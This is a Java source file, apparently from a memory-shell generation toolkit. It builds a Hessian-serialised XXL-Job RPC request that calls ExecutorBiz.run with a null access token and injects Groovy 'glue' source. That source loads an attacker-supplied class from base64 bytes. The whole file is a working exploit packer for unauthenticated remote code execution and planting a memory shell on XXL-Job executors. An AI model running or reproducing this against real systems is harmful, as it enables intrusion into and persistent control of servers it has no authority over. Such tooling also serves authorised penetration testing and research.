package com.reajason.javaweb.packer.xxljob;

import com.caucho.hessian.io.Hessian2Output;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packer;
import com.reajason.javaweb.packer.Util;
import com.xxl.job.core.biz.model.TriggerParam;
import com.xxl.rpc.remoting.net.params.XxlRpcRequest;
import lombok.SneakyThrows;

import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.UUID;

/**
 * @author ReaJason
 * @since 2026/07/14
 */
public class XxlJobHessianPacker implements Packer {
    private final String template = Util.loadTemplateFromResource("/memshell-party/XXL-Job-DefineClass.java");

    @Override
    @SneakyThrows
    public String pack(ClassPackerConfig config) {
        String source = template.replace("{{className}}", config.getClassName())
                .replace("{{base64Str}}", config.getClassBytesBase64Str());

        TriggerParam triggerParam = new TriggerParam();
        triggerParam.setJobId(1);
        triggerParam.setExecutorHandler("demoJobHandler");
        triggerParam.setExecutorParams("demoJobHandler");
        triggerParam.setExecutorBlockStrategy("COVER_EARLY");
        triggerParam.setExecutorTimeout(0);
        triggerParam.setLogId(1);
        triggerParam.setLogDateTime(System.currentTimeMillis());
        triggerParam.setGlueType("GLUE_GROOVY");
        triggerParam.setGlueSource(source);
        triggerParam.setGlueUpdatetime(System.currentTimeMillis());
        triggerParam.setBroadcastIndex(0);
        triggerParam.setBroadcastTotal(0);

        XxlRpcRequest rpcRequest = new XxlRpcRequest();
        rpcRequest.setRequestId(UUID.randomUUID().toString());
        rpcRequest.setCreateMillisTime(System.currentTimeMillis());
        rpcRequest.setAccessToken(null);
        rpcRequest.setClassName("com.xxl.job.core.biz.ExecutorBiz");
        rpcRequest.setMethodName("run");
        rpcRequest.setParameterTypes(new Class<?>[]{TriggerParam.class});
        rpcRequest.setParameters(new Object[]{triggerParam});

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(bos);
        hessian2Output.writeObject(rpcRequest);
        hessian2Output.flush();
        return Base64.getEncoder().encodeToString(bos.toByteArray());
    }
}
